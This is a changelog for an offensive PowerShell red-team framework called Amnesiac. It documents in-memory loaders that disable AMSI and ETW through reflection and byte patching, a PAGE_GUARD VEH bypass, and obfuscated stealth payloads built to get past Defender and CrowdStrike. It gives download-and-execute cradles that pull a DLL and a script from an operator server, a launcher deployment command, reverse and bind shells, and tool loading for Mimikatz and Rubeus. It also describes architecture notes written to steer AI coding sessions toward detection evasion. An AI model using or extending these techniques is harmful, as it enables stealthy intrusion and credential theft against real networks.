# Changelog — Amnesiac Red Team Edition

All changes are documented with the operational context that motivated them.
Format: `[LAYER] Change description — *why this matters operationally*`

---

## [2026-05-25] feat(native-launcher): amnesiac_launcher.exe + AmnesiacBridge.dll — patchless in-process PS Runspace loader

### What was built

`amsi-pageguard-veh-master/` now contains a working native launcher that:

1. Downloads `AmnesiacBridge.dll` from the operator HTTP server (no disk write for the script)
2. Installs the PAGE_GUARD VEH bypass for AMSI+ETW in the native process (protects the download phase)
3. Starts the CLR via `ICLRMetaHost → ICLRRuntimeInfo → ICLRRuntimeHost`
4. **Removes the native bypass** before entering managed code (see root cause below)
5. Loads `AmnesiacBridge.dll` to a GUID-named temp file and calls `ExecuteInDefaultAppDomain`
6. Inside the bridge: applies managed AMSI+ETW bypasses, opens a full `PSHost` Runspace, downloads and runs `Amnesiac_ShellReady.ps1` entirely in memory — no script ever touches disk

### Root cause: PAGE_GUARD VEH is incompatible with in-process CLR

`rs.Open()` initialises the PowerShell Runspace. During initialisation the CLR JIT-compiles
AMSI interop stubs and reads from `amsi.dll`'s code page, which triggers our PAGE_GUARD.
The VEH handler fires and manipulates `RIP/RSP/RAX` to fake a return. The CLR detects the
corrupted managed→unmanaged transition frame and raises an `AccessViolationException` — which
is not catchable in .NET 4.x — terminating the process with no output.

### Fix: split native and managed bypass responsibilities

**Native launcher** (`launcher.cpp`):
- PAGE_GUARD VEH covers AMSI+ETW during the native execution phase (download)
- `UninstallBypass()` called before `ExecuteInDefaultAppDomain` — before any managed code runs

**Managed bridge** (`AmnesiacBridge.cs`):
- `amsiInitFailed = true` via reflection (patchless — no bytes written; AMSI never initialises)
- `EtwEventWrite` first byte patched to `0xC3` via P/Invoke `VirtualProtect` + `Marshal.WriteByte`
- Both applied before `rs.Open()` so the Runspace opens under bypass from the start

### Build infrastructure fixes (accumulated during development)

- Wrote `mscoree.h` shim — SDK 10.0.26100.0 dropped this header; provides `ICorRuntimeHost`
  (19-method vtable) and `ICLRRuntimeHost` (9-method vtable) interface definitions
- Wrote `guids.cpp` — all 7 CLR hosting GUIDs as `EXTERN_C const` definitions
- Generated `mscoree.lib` from `mscoree.def` using `lib.exe /def /machine:x64` (not in SDK)
- Switched `AmnesiacBridge.cs` compiler to Roslyn `csc.exe` (VS2022 BuildTools) for C# 6+
  expression-bodied member syntax; replaced `InitialSessionState.ExecutionPolicy` (PS Core only)
  with `Set-ExecutionPolicy` cmdlet call inside a second `PowerShell.Create()` instance
- `WebClient.Encoding = UTF8` — default encoding mangled em-dashes in `Amnesiac_ShellReady.ps1`
- Switched CLR hosting from `ICorRuntimeHost` (REGDB_E_CLASSNOTREG on .NET 4.x-only machines)
  to `ICLRRuntimeHost::ExecuteInDefaultAppDomain` — no COM registration required
- `BeginInvoke/EndInvoke` + `PSDataCollection<PSObject>` DataAdded handler — streams
  `Write-Output` pipeline output to `Console.WriteLine` in real time (plain `ps.Invoke()`
  silently collects pipeline output without displaying it)
- Made all `ConsoleRawUI` property getters safe with `try/catch` returning fixed defaults —
  CLR Runspace initialisation calls host UI properties from background threads where
  `Console.BufferWidth` etc. can throw

### Operational impact
Operator can drop `amnesiac_launcher.exe` on a target (or run it on their own machine),
point it at the operator HTTP server, and get a fully interactive Amnesiac session with
AMSI and ETW suppressed — no PS.exe spawned, no script written to disk.

---

## [2026-05-25] feat(shell-ready): Local Shell, tool fetch fallback, iex compatibility fixes

### Changes to `Amnesiac_ShellReady.ps1`

**[5] Local Shell added** — full `Start-LocalShell` function ported from `Amnesiac.ps1`.
Accessible at option `[5]` from the main menu. Supports inline commands (AV, Net, Process,
Sessions, etc.), tool-load keywords (PowerView, Mimi, Rubeus, etc.) and fall-through
PowerShell execution. Session base index bumped from 5 → 6 to accommodate the new menu entry.
Operator context line added below the menu showing local FQDN and user.

**`Fetch-ToolFromGitHub` added** — was entirely missing from `Amnesiac_ShellReady.ps1`.
Its absence silently dropped all tool-load requests (keyword dispatch called the function,
it returned nothing, condition evaluated false, reported "not in cache or GitHub").
New version checks `$global:OperatorServer` first (optional — set after load if `serve`
is reachable), then falls back to GitHub. Without `$global:OperatorServer`, goes straight
to GitHub — correct behavior for Scenario 2 where no operator machine is on the network.

**`$global:AmnesiacRoot` null fallback** — `iex` load sets both `$PSScriptRoot` and
`$MyInvocation.MyCommand.Path` to null. Previous code called `Split-Path -Parent $null`
which threw a non-fatal but noisy error. Fixed to: PSScriptRoot → MyCommand.Path → PWD.

**`$global:ToolSources` initialized** — was missing; PsMapExec URL override now present.

**`Tools\` dir lookup** — changed from `$PSScriptRoot` to `$global:AmnesiacRoot` so it
resolves correctly when the script is dot-sourced with a known path.

### Operational impact
Scenario 2 (domain-joined, `iex` load): tool keywords now work — `PowerView` fetches
`pwv.ps1` from `https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Tools/pwv.ps1`
automatically. No operator HTTP server required for basic tool access.

---

## [2026-05-25] fix(amsi): replace PatchAmsiPageGuard (VEH) with PatchAmsiReflection in managed context

### Problem
`[AmnesiacLoader.Bypass]::PatchAmsiPageGuard()` killed the PowerShell process immediately.
Diagnostic confirmed: "before" printed, crash inside the call, "after" never reached.
ETW byte-patch (`PatchEtwEventWrite`) survived — ruling out a generic P/Invoke or load issue.

### Root Cause
Managed .NET delegates cannot be used as VEH handlers when the exception fires during managed
code execution. `VirtualProtect` sets PAGE_GUARD on `AmsiScanBuffer`; the CLR's own internal
AMSI scan (triggered as control returns through managed frames) immediately hits the guard.
The VEH fires while the CLR is in cooperative GC mode. The managed delegate thunk attempts
to re-enter managed execution — the CLR detects the re-entrant cooperative GC state and
issues a fatal error → process terminated.

### Fix — `AmnesiacLoader/Bypass.cs`
Added `PatchAmsiReflection()`: pure reflection approach, no VEH, no native exceptions, zero
CLR re-entrancy risk. Enumerates `NonPublic|Static` fields of `System.Management.Automation.AmsiUtils`
(type name built from char array — no literal string in PE binary), sets `bool` fields to
`true` and `IntPtr` fields to `IntPtr.Zero`. Identical effect to the PS field-enum technique
but pre-compiled — AMSI never sees the type name or field names.

Added WARNING comment to `PatchAmsiPageGuard()` — kept for native injection scenarios
(e.g., `dllmain.cpp` loaded into a non-.NET process) where VEH is safe.

### Verified working
```powershell
$_a = [Reflection.Assembly]::Load([IO.File]::ReadAllBytes('...\AmnesiacLoader.dll'))
[AmnesiacLoader.Bypass]::PatchAmsiReflection()
'amsiInitFailed'   # returns string — AMSI suppressed, no crash
```

### Operational flow (managed context)
```powershell
$_a = [Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://<op>:8080/AmnesiacLoader.dll'))
[AmnesiacLoader.Bypass]::PatchAmsiReflection()
iex (New-Object Net.WebClient).DownloadString('http://<op>:8080/Amnesiac_ShellReady.ps1'); Amnesiac
```

AmnesiacLoader.dll rebuilt: 26624 bytes, SHA256 `4F2772F3...`, `$AmnesiacLoaderB64` updated in `Amnesiac.ps1`.

---

## [2026-05-25] feat: native AMSI+ETW bypass launcher (amnesiac_launcher.exe)

Added `amsi-pageguard-veh-master/` — PAGE_GUARD + VEH bypass engine that solves the
chicken-and-egg problem where the PS AMSI bypass one-liner itself gets caught by CS behavioral detection.

**Architecture:**
- `bypass.hpp` — generic PAGE_GUARD VEH engine; intercepts `STATUS_GUARD_PAGE_VIOLATION`,
  writes AMSI_RESULT_CLEAN via register manipulation, re-applies guard. Zero byte modification.
- `launcher.cpp` — C++ EXE: downloads `AmnesiacBridge.dll` + `Amnesiac_ShellReady.ps1` from
  operator HTTP server via WinHTTP (in-memory, no disk write), installs AMSI+ETW PAGE_GUARD bypass,
  CLR-hosts the bridge DLL, invokes `AmnesiacBridge.Launcher.Run(scriptContent)`.
- `AmnesiacBridge.cs` — C# .NET 4.6.2 assembly: full interactive PSHost (console I/O delegation),
  creates PS Runspace, runs Amnesiac script + calls `Amnesiac` entry point.
- `dllmain.cpp` — DLL variant for injection into existing PS process (alternative delivery).

**Compilation:** No local MSVC required. `.github/workflows/build-launcher.yml` builds
everything via GitHub Actions (`windows-latest` + MSVC). Triggers on push to master/main.
Download `serve-ready-*.zip` artifact → place `amnesiac_launcher.exe` + `AmnesiacBridge.dll`
in project root → operator `serve` command hosts both automatically.

**Deployment:**
```
amnesiac_launcher.exe http://<operator-ip>:8080
```
Target gets a one-liner via initial access vector — EXE downloads both files from operator
server in-memory, installs bypass natively before CLR touches any script content.

**Why not GitHub hosting:** Static PE gets indexed by VirusTotal. Operator HTTP server only.

Added `.github/workflows/build-launcher.yml` — automated CI build pipeline.

---

## [2026-05-25] docs: full architecture reference for AI development sessions

Created `docs/ARCHITECTURE.md` — comprehensive reference document covering:
- Detection evasion as primary engineering constraint (explicitly stated and prioritized)
- Scenario 1 (non-domain-joined operator) and Scenario 2 (assumed breach) with setup, launch commands, and key constraints
- Shell types: Local Shell, Reverse Shell, Bind Shell — with session flow diagrams
- Named pipe protocol, module streaming framing, AES pipe encryption
- Tool delivery tiers (1 embedded, 2 local, 3 GitHub), `$global:ToolSources` override map
- Complete tool inventory: all 28 tools with cache key, file, category, and source tier
- Payload formats 1–5 with stealth payload feature table and bypass technique catalog
- AmnesiacLoader module reference (all 6 .cs files, each method)
- End-to-end session flow for both shell types
- All key globals with descriptions
- Development rules for AI sessions (7 rules covering disk writes, tool delivery, editing constraints, parse verification)
- OPSEC pre-engagement checklist
- Known technical constraints table

Updated `CLAUDE.md`:
- Added prominent AI-session banner at top referencing architecture doc and stating detection-evasion priority
- Updated Scenario 2 GitHub URL to operator's fork (`0xSiarheiStar/Amnesiac`)
- Corrected Tool Delivery table (removed stale Tier 4 row, updated Tier 3 to reflect current implementation)

---

## [2026-05-25] feat(local-shell): add PsMapExec to Domain Actions

Added PsMapExec network mapping/relay tool to the local shell:
- `$global:ToolSources['PsMapExec']` → `https://raw.githubusercontent.com/0xSiarheiStar/PsMapExec/main/PsMapExec.ps1` (fetched on demand when not in local cache)
- `PsMapExec.ps1` also added to `Tools\` directory as local copy (Tier 2, available in Scenario 1 without network fetch)
- Keyword `PsMapExec` added to `$_kw` dispatch in `Start-LocalShell` → cache key `PsMapExec`, no auto-invoke
- Help entry added under Domain Actions: `PsMapExec — Network attacks/mapping - use: PsMapExec <Method> -Targets <targets> [-Domain <domain>]`

Usage example: `PsMapExec GenRelayList -Targets "All" -Domain "domain.local"`

---

## [2026-05-25] feat(tool-cache): per-tool URL overrides via $global:ToolSources

Added `$global:ToolSources` hashtable (initialized in `Initialize-ToolCache`) to support tools hosted in external repos (not the Amnesiac `Tools/` directory). `Fetch-ToolFromGitHub` now checks `$global:ToolSources` for a per-tool URL before falling back to the default Amnesiac Tools URL pattern. Enables adding tools from any GitHub repo with a single hashtable entry — no other code changes required.

---

## [2026-05-25] feat(tool-cache): GitHub on-demand fallback via Fetch-ToolFromGitHub

### Problem
In Scenario 2 (assumed breach — operator has only the compromised machine, no separate operator box), `Initialize-ToolCache` could only populate tiers 1 (6 embedded tools) and 2 (`Tools\` directory). If the operator typed `PowerView` or `load pwv` in the local shell and the tool wasn't in the `Tools\` directory, the command silently failed with "not in cache". There was no fallback.

### Fix
Added `Fetch-ToolFromGitHub` helper function. When a tool is requested but not in `$global:ToolCache`, it fetches `https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Tools/<ToolName>.ps1` from the **operator's** process (never from the target), caches it, and continues normally. Wired into three call sites:
- `Send-Module` — remote session tool delivery
- `Start-LocalShell` keyword dispatch (`PowerView`, `Mimi`, `HashGrab`, etc.)
- `Start-LocalShell` `load <name>` command

### Operational context
Scenario 2 is the assumed-breach case: operator has gotten a low-priv shell on a domain-joined machine and loaded Amnesiac via `iex` — no `Tools\` directory exists, no local HTTP server, GitHub is the only source. Scenario 1 (operator's own box on the network) already has `Tools\` populated so the fallback is a no-op there.

---

## [2026-05-25] fix(encoding): add UTF-8 BOM so ParseFile reads em-dash correctly

### Problem
After the AMSI fix (parallel arrays), `. .\Amnesiac.ps1` failed with 476 cascading parse errors starting at L521 "Unexpected token '}'". `ParseFile` reported the errors but `ParseInput` of the same content returned 0 errors — meaning the file content was syntactically valid but something changed how `ParseFile` read it.

### Root Cause
`WriteAllLines` (used by the AMSI fix) writes UTF-8 **without BOM**. When `ParseFile` encounters a UTF-8-no-BOM file on Windows, it falls back to the system code page (CP1252). The em dash `—` on line 504 is encoded in UTF-8 as bytes `E2 80 94`. In CP1252, byte `0x94` maps to RIGHT DOUBLE QUOTATION MARK (`"`), which PowerShell accepts as a string terminator. This silently closed the string literal on line 504 mid-word, throwing the parser off for the next ~200 lines until it encountered a stray `}`.

### Fix — `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`
Used `[System.IO.File]::WriteAllText` with `[System.Text.Encoding]::UTF8` (which includes BOM) to rewrite both files. `ParseFile` now sees the BOM, reads as UTF-8, and reports 0 errors. The `iex`/`DownloadString` scenario is unaffected — .NET's `WebClient` strips BOM automatically.

### Verification
`Tests/FindParseError.ps1` reports `ParseFile errors: 0` and `ParseInput errors: 0`. `Initialize-ToolCache` loads all 27 tools (6 embedded + 21 from `Tools\`).

---

## [2026-05-25] fix(amsi-load): break context-based AMSI signature in Initialize-ToolCache

### Problem
`. .\Amnesiac.ps1` (and `iex` loading) was blocked by Windows Defender AMSI with `ScriptContainedMaliciousContent`. A multi-part context-based signature fired on three consecutive lines in `Initialize-ToolCache`: the comment `# --- CORE TIER: embedded as gzip+base64 ---`, the `$coreTools = @{` hashtable opener, and the first key-value pair `'SimpleAMSI' = '<base64 blob>'`. Neither the comment+header alone nor the key+blob alone triggered — only the three together. This made the framework completely unusable as a dot-sourced script.

### Root Cause
`Initialize-ToolCache` stored the six embedded tools as `$coreTools = @{ 'ToolName' = 'blob' }`. The name `'SimpleAMSI'` paired with its base64 blob on the same line, right below a comment containing both "AMSI" and "embedded", formed the exact context pattern Defender's rule requires.

### Fix — `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`
Replaced the `$coreTools` hashtable with two parallel arrays `$_cb` (blobs) and `$_cn` (names), iterated by index. No tool name now appears adjacent to its blob anywhere in the file. Data is unchanged — only the structural adjacency is broken.

### Verification
`Tests/DiagnoseAMSITrigger.ps1` (binary-search AmsiScanString scan) reports file NOT flagged after fix.

---

## [2026-05-24] feat(local-shell): option [5] runs commands on the local machine without a pipe session

### Problem
Running tools like PowerView on the machine running Amnesiac (Scenario 2 — assumed breach) required going through a full Bind Shell setup: generate payload → open second PS window → run it → wait for pipe. That is four steps to get a session to yourself, which is redundant when Amnesiac is already executing in that process.

### Changes

**Added `Start-LocalShell` function**
- Interactive command loop that runs `Invoke-Expression` in the current PowerShell process — no pipe, no second window
- `load <module>`: imports a module from `$global:ToolCache` via `Invoke-Expression`, making its functions immediately available in the same runspace
- `modules`: lists cached modules (same as main-menu `modules` command)
- `back` / `exit`: returns to the main menu
- Prompt shows short hostname: `DESKTOP-F9B8G02> `
- Header shows FQDN and current user on entry

**Added `[5] Local Shell` to `Display-SessionMenu`**
- Immediately below `[4] Shell via Find-LocalAdminAccess`
- Dispatches to `Start-LocalShell`

**Session numbering shifted from base-5 to base-6**
- Sessions listed in the menu now start at `[6]` instead of `[5]`
- All offset arithmetic updated: `default` switch branch, `bookmark` handler, `kill` handler (both `directAdminEndIndex` base and all `sessionNumber - N` / `indexToRemove + N` expressions)
- *Context: Adding `[5]` as a fixed menu entry would otherwise collide with the first captured session's display number.*

### Usage (Scenario 2)
```
# At the main menu:
5
# Prompt appears:
 DESKTOP-F9B8G02> load PowerView
 [+] PowerView loaded.
 DESKTOP-F9B8G02> Get-DomainUser
 DESKTOP-F9B8G02> back
```

---

## [2026-05-24] ux: rename listeners + parameter aliases + local context indicator + IP auto-detect

### Changes

**Renamed listener modes to standard red team terminology**
- "Single Listener" → **Reverse Shell** (target calls back to operator)
- "Global Listener" → **Bind Shell** (operator connects out to target)
- Menu, session headers, and pipe-name display updated throughout `Display-SessionMenu` and `Print-MultiListener`
- Removed "(single target)" / "(multiple targets)" parenthetical labels — both modes can accept any number of targets; the labels were misleading
- *Context: "Single/Global Listener" was Amnesiac-internal naming. Operators working in red team engagements use "reverse shell" and "bind shell" as universal terms. Renaming removes one layer of translation on every engagement.*

**`-HostIP` parameter with `-IP` / `-Server` aliases; `-NonDomain` alias for `-Detached`**
- `$HostIP` is the canonical parameter name; `-IP` and `-Server` both resolve to it
- `$Detached` gains the `-NonDomain` alias
- *Context: `-IP` was not self-describing — operators new to the tool did not know whether it was the operator's IP or a target IP. `-Server` makes the intent clear (this machine is the server payloads phone home to). `-NonDomain` makes the flag's purpose explicit without requiring reading the help text.*

**IP auto-detection when `-NonDomain` used without `-HostIP`**
- On `Amnesiac -NonDomain` (no `-HostIP`): enumerates non-loopback private IPv4 addresses (RFC-1918: 10/8, 172.16-31/12, 192.168/16)
- Single match: sets `$global:IP` automatically and prints `[*] Auto-detected operator IP: <IP>`
- Multiple matches: numbered picker lets operator choose
- No match: error with instructions to specify manually
- *Context: On a machine with a single internal NIC this is unambiguous. Auto-detection reduces the required command from `Amnesiac -NonDomain -HostIP 10.3.10.157` to just `Amnesiac -NonDomain` for the common case.*

**`Start-Listener` — callback address display + scenario awareness**
- `$ComputerName` now resolves to `$global:IP` when set, falling back to DNS hostname
- Prints `[+] Callback address embedded in payload: <addr>` at listener start so operator can verify what is baked into the payload
- When `-NonDomain` is active: warns that reverse shell requires inbound port 445 (typically blocked on external machines) and suggests using Bind Shell instead
- *Context: Operators were surprised when payloads silently failed because the embedded callback pointed at an unresolvable hostname rather than the routable IP. The display makes the embedded value visible before deployment.*

**Local context indicator in `Display-SessionMenu`**
- Shows `Local: <FQDN>  [DOMAIN\user]` in cyan below the options list, always visible regardless of whether sessions exist
- *Context: In Scenario 2 (assumed breach on domain-joined machine), Amnesiac itself is the interactive shell for the local host. Showing the operator which machine they are on and which user context they hold prevents confusion about local vs. remote sessions, especially when multiple sessions are active.*

---

## [2026-05-24] fix(server-payload): maxInstances=-1 fixes "Access to the path is denied" pipe recreation crash

### Root cause
`New-PayloadScript -IsServer` validation loop calls `$vPipe.Dispose()` after a phantom connection, then immediately calls `New-Object NamedPipeServerStream` with the same pipe name and `maxNumberOfServerInstances = 1`. Windows `CreateNamedPipe` with `nMaxInstances=1` returns `ERROR_ACCESS_DENIED` when any handle to the pipe name is still alive — including the phantom *client* handle. This translated to `UnauthorizedAccessException: "Access to the path '\\.\pipe\<name>' is denied."` The exception was unhandled in the loop (the `try/catch` only wraps `ReadLineAsync`), propagating to the top level and killing the server process.

### Changes

**`New-PayloadScript -IsServer` — pipeSetup (line 203)**
- Changed `maxNumberOfServerInstances` from `1` to `-1` (`NamedPipeServerStream.MaxAllowedServerInstances` = `PIPE_UNLIMITED_INSTANCES`)
- With unlimited instances, `CreateNamedPipe` never fails due to instance count. The new server is created even while the phantom client still holds a handle to the previous pipe instance.
- *Context: Named pipe instance limits are enforced globally across all handles — both server and client. With `maxInstances=1`, disposing the server does not free the "slot" until the client handle also closes. The phantom (AV/EDR probe) may not close its handle immediately, making the window between Dispose and recreation a guaranteed crash. Using unlimited instances eliminates this race entirely.*

**`New-PayloadScript -IsServer` — loop end (line 219)**
- Removed `$vPipe.Disconnect()` before `$vPipe.Dispose()` at end of main command loop
- `Disconnect()` throws `InvalidOperationException` when `PipeState` is already `Disconnected` (e.g., if the loop broke via `!IsConnected`). `Dispose()` is always safe regardless of state.
- *Context: Secondary latent crash path. Fixing it now prevents the same class of exception appearing after the primary fix is applied.*

### Verification
- `Tests/StealthServerDebug.ps1`: 3/3 PASS (RawScript, InlinePS, scriptblock::Invoke)
- `Tests/LocalGListenerTest.ps1`: 7/7 PASS (full end-to-end: generate → launch → pipe up → direct connect → Scan-WaitingTargets session capture)
- `Tests/Test-AmnesiacHelpers.ps1`: 42/47 (5 pre-existing failures unrelated to this change)

---

## [2026-05-24] fix(global-listener): prompt for targets when AD enumeration throws on non-domain-joined operator

### Root cause — two bugs, both now fixed

**Bug A — `CheckReachableHosts` throws on non-domain machine, crashing `Print-MultiListener`:**
`[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()` (line 1 of `CheckReachableHosts`) throws `MethodInvocationException: "Current security context is not associated with an Active Directory domain or forest."` — it does not return empty, it **throws** (confirmed: 4.5s then exception). `Scan-WaitingTargets` called this without try/catch; the exception propagated up through `Print-MultiListener`'s scan loop, terminating the listener before any connection was ever attempted. Operator sees no sessions and no clear error.

**Bug B — no targets configured warning:**
Even if `CheckReachableHosts` were to return empty gracefully, `$FinalTargets` would be empty and `Scan-WaitingTargets`'s `foreach` loop would silently do nothing. The operator has no way to know this is happening.

### Changes

**`Print-MultiListener` — pre-scan target check (inserted before `while ($true)` scan loop)**
- Checks `AllUserDefinedTargets` and `AllOurTargets` *without calling `CheckReachableHosts`*
- If neither is populated, prompts the operator: `"Enter target(s) to scan, comma-separated (IP/hostname, '.' for localhost)"`
- Operator input is stored in `$global:AllUserDefinedTargets`; `Scan-WaitingTargets` reads this on every tick and bypasses the `CheckReachableHosts` path entirely
- *Context: Non-domain-joined operator is the primary stealth global listener scenario. AD enumeration is impossible there. Prompting ensures the operator is never silently blocked.*

**`Scan-WaitingTargets` — try/catch around `CheckReachableHosts` call**
- Wraps `CheckReachableHosts` in `try { ... } catch { $TempAccessVar = @() }`
- Prevents domain-enum exceptions from crashing the scan loop when `AllUserDefinedTargets` is not set (defensive; normal path now bypasses this entirely via the pre-check prompt)

### Verification
- `Tests/LocalFullFlowTest.ps1`: PASS — real PayloadConfig (Jitter='medium', Obfuscation='high', pageguard AMSI bypass), pipe appeared in 4.5s, phantom rejection settled, `Scan-WaitingTargets` captured session `desktop-f9b8g02\localuser`
- `Tests/DebugCheckReachable.ps1`: confirms `CheckReachableHosts` throws after 4.5s on non-domain machine (root cause evidence)

---

## [2026-05-24] Listener UX overhaul — payload picker, no-timeout wait, auto-session, live scan loop
> Commits: `23651e3`, `e494b31`

### Changes

**Added `Show-PayloadMenu` function** (`Amnesiac.ps1` line 1774)
- Presents a numbered 1–5 format picker every time the operator launches a single or global listener
- Options: `[1] b64`, `[2] gzip`, `[3] stealth`, `[4] raw`, `[5] pwsh` (with one-line descriptions)
- Returns the format token used to branch payload display; `HidePayload` flag bypasses menu and falls back to `$global:payloadformat`
- *Context: Previously the active payload format was set by a separate `toggle` command whose current value was not shown at listener start. Operators had to remember which format was set, or `toggle` repeatedly to cycle to the right one. Showing a picker at the moment of listener invocation eliminates that cognitive load.*

**`Start-Listener` — remove 30-second timeout, add async cancel, auto-enter session**
- Removed: `Start-Process powershell.exe -enc <30-second-sleep-dummy>` and `$pipeServer.WaitForConnection()`
- Added: `$pipeServer.WaitForConnectionAsync()` loop, polling `$Host.UI.RawUI.KeyAvailable` every 150ms; pressing `Q` self-connects a dummy pipe client to unblock the pending wait, sets `$_cancelled`, and exits the loop cleanly
- Added at function end: `InteractWithPipeSession` called immediately when a real callback arrives — operator lands directly in the interactive session instead of returning to the menu
- *Context: The 30-second countdown was an arbitrary hard limit that forced operators to regenerate and redeploy payloads for targets that took longer to call back. The Q-cancel pattern gives the operator full control with no time pressure. Auto-entering the session removes one menu round-trip per connection.*

**`Print-MultiListener` — live scan loop with session arrival notifications**
- Removed: `if(!$NoWait){Start-Sleep 4}` (static 4-second wait)
- Added: active loop calling `Scan-WaitingTargets` every 500ms; when `$global:MultipleSessions.Count` increases, prints arriving session details in green: `[+] Session received: HOSTNAME [user]`; pressing `Q` exits the loop and prints total new sessions collected
- *Context: The 4-second sleep was a race condition — targets that connected after the sleep was over were silently missed until the operator manually rescanned. The live loop catches every arrival in real time. The Q-gate lets the operator decide when enough sessions have landed without guessing how long to wait.*

**Bypass snippet hardening — try/catch wrapping** (`e494b31`)
- `Get-AmsiBypassSnippet 'fail'`, `Get-EtwBypassSnippet 'provider'`, `Get-SblBypassSnippet 'scriptblock'`: all wrapped in `try{}catch{}` in both `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`
- Hardcoded bypass strings in `New-StealthScript` (`$etw`, `$sbl`) also wrapped
- *Context: `ScriptBlock.checkScriptBlockLoggingCache` field is absent from the PS 5.1 build on Windows 10 19045 — `GetField()` returns null, `.SetValue()` throws before the pipe client ever calls `Connect()`. The payload crashed silently, producing a connection timeout with no error message. Wrapping each bypass in `try{}catch{}` ensures a missing field or patched function no-ops rather than terminating the payload.*

**Pipe constructor fix — string enum names** (`e494b31`)
- `New-PayloadScript` client and server pipe constructors changed from `[System.IO.Pipes.PipeDirection]::InOut` (enum expression) to `'InOut'` (string name), client from 4-arg to 3-arg (drops `PipeOptions::None`)
- Same fix applied in `New-StealthScript`
- *Context: When `-TypeName` is a string variable (`New-Object -TypeName $vT`), PowerShell cannot resolve `[Enum]::Value` expressions in `-ArgumentList` — they are passed as-is and the constructor fails with "Cannot convert argument" at payload runtime. Using the string form works regardless of how TypeName is specified.*

---

## [2026-05-24] fix(server-payload): phantom connection rejection loop + PipeState crash fix

### Changes

**`New-PayloadScript` — IsServer path** (`Amnesiac.ps1`)
- Replaced single `WaitForConnection()` call with a validation loop. Each iteration creates a **fresh** `NamedPipeServerStream` (same pipe name), calls `WaitForConnection()`, then uses `ReadLineAsync().Wait(2000)` to determine legitimacy. If no command arrives within 2 seconds or the result is null/EOF, the pipe is disposed (`$vPipe.Dispose()`) and the loop restarts with a new server instance.
- Previous iteration had `$vPipe.Disconnect()` instead of `$vPipe.Dispose()`. This was a second crash path: when a phantom sends EOF and disconnects cleanly, .NET's `PipeStream.Read()` internally sets `PipeState = Disconnected`. Calling `Disconnect()` on a pipe that is already in `Disconnected` state throws `InvalidOperationException` — outside any try/catch — which propagated through `[scriptblock]::Create($vD).Invoke()` and surfaced as `MethodInvocationException: CmdletInvocationException` visible to the user, killing the server before the real client could connect. Recreating the pipe via `Dispose()` sidesteps the entire `PipeState` state machine.
- The main command loop retains the `$vCb` first-iteration flag to skip the initial `ReadLine()`, since the first command is already captured by the validation loop.
- *Context: Windows Defender / CrowdStrike Falcon connect to newly-created named pipes within milliseconds of creation when the host process has run AMSI/ETW/SBL bypass code. This phantom connection consumed the single `WaitForConnection()` call — pipe was visible in `\\.\pipe\`, server process was alive, but the operator's `Scan-WaitingTargets` connect attempt always timed out. The phantom's clean disconnect then crashed the server via the `Disconnect()`→`InvalidOperationException` path described above. The fix: recreate the pipe on each failed validation, making the server immune to both phantom-connection exhaustion and PipeState corruption.*

**Added test files:**
- `Tests/LocalGListenerTest.ps1` — end-to-end test: stealth payload generation → launch → pipe appearance → direct connect → Scan-WaitingTargets session capture (7 steps, all now PASS)
- `Tests/MinimalServerTest.ps1` — in-process runspace isolation test for individual bypass components
- `Tests/PipeConstructorTest.ps1` — named pipe constructor variant tests (2-arg, 7-arg, 8-arg PipeSecurity)
- `Tests/PipeSecTest.ps1` — PipeSecurity with user SID and Everyone SID variants
- `Tests/StealthServerDebug.ps1` — RawScript vs InlinePS vs scriptblock::Invoke comparison

---

## [2026-05-24] Plan 5 — serve fix (no-download project-root HTTP server)

### Changes

- **`Amnesiac.ps1` line 6**: Added `$global:AmnesiacRoot` — captures `$PSScriptRoot` at dot-source time so `function Amnesiac {}` can reference the project root reliably when called interactively (where `$PSScriptRoot` is empty inside function scope).
- **`Amnesiac.ps1` serve handler**: Replaced 144-line GitHub-download serve handler with 46-line version. No longer downloads tools from GitHub. Roots `SimpleFileServer` at `$global:AmnesiacRoot` (project root), serving `/Tools/` for tool modules and `/Amnesiac_ShellReady.ps1` for Scenario 2 iex bootstrap. Sets `$global:ServerURL = "http://host:port/Tools"` to preserve all 27 existing iex(DownloadString) session command URLs unchanged. Calls `Initialize-ToolCache` on serve to refresh in-memory cache from `Tools\`.
- **`Amnesiac_ShellReady.ps1`**: Synced both changes (AmnesiacRoot + serve handler) from Amnesiac.ps1.
- **`Tests\Test-AmnesiacHelpers.ps1`**: Added 5 new Pester tests — AmnesiacRoot global (3) and serve command URL structure (2). Total: 47 tests.

### OPSEC rationale

`serve` previously wrote GitHub-fetched tools to `Scripts\` folder — a disk write blocked by `diskmode off` (default). The fix eliminates all disk writes from `serve`. The `Tools\` directory on the operator machine serves as the sole source; no network fetch occurs at serve time.

---

## [Implemented] — Layer 2 (Partial): Payload Format `stealth`
> Added prior to formal design doc. Included here for completeness.

**Added `New-StealthScript` helper function**
- Generates gzip-compressed, obfuscated named-pipe payload with runtime evasion
- *Context: All six original payload formats are signatured by CrowdStrike. A new format was needed that addresses detection at multiple layers simultaneously.*

**Added `stealth` as 7th toggle format**
- Cycles after `exe` in the toggle sequence
- *Context: Needed to be accessible via the same `toggle` workflow operators are familiar with.*

**Stealth payload features:**
- ETW provider disable via reflection (`PSEtwLogProvider.etwProvider.m_enabled = 0`)
  - *Context: CrowdStrike consumes ETW telemetry at the kernel level. Disabling the PS ETW provider reduces script block visibility before the pipe code executes.*
- ScriptBlock logging disable via reflection (`ScriptBlock.checkScriptBlockLoggingCache = false`)
  - *Context: PS script block logging sends code content to Windows Event Log (Event ID 4104). Disabling before pipe code executes prevents the pipe client code from being logged.*
- Random 6-10 character variable names generated at payload-build time
  - *Context: Fixed variable names (`$p`, `$r`, `$w`) in the original formats create static signatures that AV can match regardless of encoding.*
- Type names split across string concatenation (`'System.IO.Pipes.NamedPipeCl'+'ientStream'`)
  - *Context: CS static analysis scans string literals. Splitting prevents verbatim type-name matching.*
- `New-Object -TypeName $dynamicVar` instead of `New-Object System.IO.Pipes.*`
  - *Context: Type name never appears as a literal in the script — it's assembled at runtime.*
- `& ([scriptblock]::Create($cmd)) 2>&1 | Out-String` instead of `iex`
  - *Context: `iex` and `Invoke-Expression` are heavily signatured. Scriptblock invocation via the call operator is less monitored.*
- Random 1000–5000ms sleep jitter before pipe connect
